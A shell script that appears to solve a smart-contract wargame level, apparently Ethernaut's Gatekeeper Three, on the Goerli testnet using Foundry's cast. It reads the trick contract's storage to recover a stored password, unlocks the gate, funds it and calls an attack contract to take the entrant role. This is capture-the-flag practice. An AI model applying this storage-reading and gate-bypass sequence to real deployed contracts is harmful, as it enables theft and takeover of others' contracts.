set -o allexport
source ./.env
source ./.env_public
set +o allexport

# echo "Setup Trick to generate password..."
# cast send $GATE \
#     "createTrick()" \
#     --private-key $PRIVATE_KEY_1 \
#     --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
#     --confirmations 3
# echo 

echo "Read trick contract address"
cast call $GATE \
    "trick()(address)" \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
echo

echo "Read owner address"
cast call $GATE \
    "owner()(address)" \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
echo

echo "Read entrant address"
cast call $GATE \
    "entrant()(address)" \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
echo

echo "Get Trick storage 0, 1, 2"
cast storage \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    $TRICK  0

cast storage \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    $TRICK  1

cast storage \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    $TRICK  2
echo


# echo "Confirm that we can validate the password without it changing..."
# cast send $TRICK \
#     "checkPassword(uint256)(bool)" \
#     $PASS \
#     --private-key $PRIVATE_KEY_1 \
#     --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
#     --confirmations 3
# echo 

# cast storage \
#     --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
#     $TRICK  2



# echo "allowEntrance before"
# cast call $GATE \
#     "allowEntrance()(bool)" \
#     --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
# echo

# echo "Set allowEntrance..."
# cast send $GATE \
#     "getAllowance(uint256)" \
#     $PASS \
#     --private-key $PRIVATE_KEY_1 \
#     --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
#     --confirmations 3
# echo 

echo "allowEntrance after"
cast call $GATE \
    "allowEntrance()(bool)" \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
echo


# echo "Gate balance before"
# cast balance $GATE \
#     --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
# echo

# echo "Transfer 0.00101 Ether"
# cast send $GATE \
#     --value 0.00101ether \
#     --private-key $PRIVATE_KEY_1 \
#     --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
#     --confirmations 3

echo "Gate balance after"
cast balance $GATE \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
echo



echo "entrant address before"
cast call $GATE \
    "entrant()(address)" \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
echo

echo "Attack..."
cast send $ATTACK \
    "attack(address)" \
    $GATE \
    --private-key $PRIVATE_KEY_1 \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    --confirmations 3
echo 

echo "entrant address after"
cast call $GATE \
    "entrant()(address)" \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
echo
